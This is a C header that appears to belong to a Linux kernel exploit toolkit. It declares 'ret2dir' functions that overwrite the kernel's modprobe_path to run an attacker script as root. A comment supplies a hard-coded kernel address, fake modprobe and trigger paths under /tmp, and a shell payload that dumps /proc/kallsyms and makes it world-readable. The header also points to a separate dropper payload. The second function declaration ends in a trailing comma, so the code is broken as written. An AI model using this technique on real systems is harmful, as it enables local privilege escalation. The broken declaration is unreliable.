#ifndef RET2DIR_H
#define RET2DIR_H

#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <string.h>
#include <unistd.h>

/*
 * Hijack modprobe_path inside call_modprobe()
 *      https://elixir.bootlin.com/linux/v6.12.34/source/kernel/module/kmod.c#L72
 *
 *  const char *modprobe_path_addr = "0xffffffff82061820";  // look up in /proc/kallsyms 
 *  const char *fake    = "/tmp/w";
 *  const char *dummy   = "/tmp/d";
 *  const char *res     = "/tmp/syms";
 *
 *  const char *payload = 
 *      "#!/bin/sh\n"
 *      "cat /proc/kallsyms > /tmp/syms\n"
 *      "chmod 777 /tmp/syms\n";
 *
 *  A return point after privesc in user space
 */

/* Test by writing a shell script for faked modprobe_path */
void ret2dir_modprobe_path_test(
    const char *modprobe_path_addr,   
    const char *fake_modprobe_path,   // e.g. "/tmp/w" 
    const char *dummy_trigger_path,   // e.g. "/tmp/d"
    const char *result_file_path,     // e.g. "/tmp/syms"
    const char *payload       
);

/* Use a dropper from payloads/dropper.h > faked modprobe_path */
void ret2dir_modprobe_path_(
    const char *modprobe_path_addr,   
    const char *fake_modprobe_path,   // e.g. "/tmp/w"
    const char *dummy_trigger_path,   // e.g. "/tmp/d"
);



#endif  // RET2DIR_H
